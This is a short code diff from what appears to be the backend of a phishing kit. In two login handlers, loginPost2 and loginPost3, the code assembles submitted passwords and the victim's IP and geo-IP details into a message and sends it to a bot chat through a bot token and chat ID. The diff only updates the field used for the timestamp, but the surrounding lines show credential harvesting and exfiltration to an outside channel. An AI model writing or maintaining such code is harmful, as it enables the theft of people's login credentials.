@@ -100,7 +100,7 @@ exports.loginPost2 = async (req, res) => {
 		`PASSWORD         : ${password}\n\n` +
 		`🌍 GEO-IP INFO\n` +
 		`IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
-		`TIME             : ${ipAddressInformation.timezone.current_time}\n`;
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` ;
          
 	const sendMessage = sendMessageFor(botToken, chatId);
     sendMessage(message);
@@ -153,7 +153,7 @@ exports.loginPost3 = async (req, res) => {
 		`PASSWORD         : ${password}\n\n` +
 		`🌍 GEO-IP INFO\n` +
 		`IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
-		`TIME             : ${ipAddressInformation.timezone.current_time}\n`;
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` ;
 
 	const sendMessage = sendMessageFor(botToken, chatId);
     sendMessage(message);
